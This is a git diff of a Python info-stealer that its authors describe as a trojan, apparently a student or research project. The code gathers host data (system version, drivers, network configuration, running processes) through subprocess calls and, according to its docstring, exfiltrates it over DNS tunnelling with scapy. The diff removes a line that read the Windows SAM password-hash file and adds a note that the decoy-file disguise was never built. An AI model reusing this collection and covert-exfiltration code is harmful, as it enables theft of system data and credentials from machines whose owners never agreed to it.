@@ -5,12 +5,17 @@ the trojan will open a legit file that the target will read (`.pdf`, `.jpeg`, et
 while reading, the malicious script will get to work, extracting useful information from the target PC,
 extracts data such as network configuration info, OS info, languages, password hashes.
 
+** the usage of that script undercover of potential legitimate file is optional,
+we did not created such trojan because of the simple reason that nowdays every simple
+antivirus software recognizes the format and fully blocking the file, so to success in trojan creating
+you should have proper knowledge about malware creating **
+
 after data is collected, it will be sent over DNS packets (DNS-Tunneling method),
 and will be sniffed and collected by us.
 
 :authors: Lior Vinman & Yoad Tamar
 
-:since: 11/06/2023
+:since: 19/06/2023
 """
 
 import scapy.all as scapy
@@ -97,16 +102,13 @@ def get_data() -> list[str]:
         data.append(subprocess.check_output(["driverquery"]).decode("latin"))
 
         # system version
-        data.append(subprocess.check_output(["ver"]).decode("latin"))
+        data.append(subprocess.check_output("ver", shell=True).decode("latin"))
 
         # network info
         data.append(subprocess.check_output(["ipconfig", "/all"]).decode("latin"))
 
         # processes info
         data.append(subprocess.check_output(["tasklist"]).decode("latin"))
-
-        # password hashes file
-        data.append(subprocess.check_output(["type", "C:\Windows\System32\config\SAM"]).decode("latin"))
 
     return data
 
@@ -149,7 +151,7 @@ if __name__ == "__main__":
 
         # After sending real data segments, we are breaking between commands with placeholder packet
         # the packet here contains request for `example.com` and `None` payload, just for cut the segments sequence,
-        # so we could know that command output ended
+        # so we could know that command output ended and print it well using our sniffer
 
         dns_hdr = scapy.DNS(qd=scapy.DNSQR(qname="example.com"), id=txid)
 
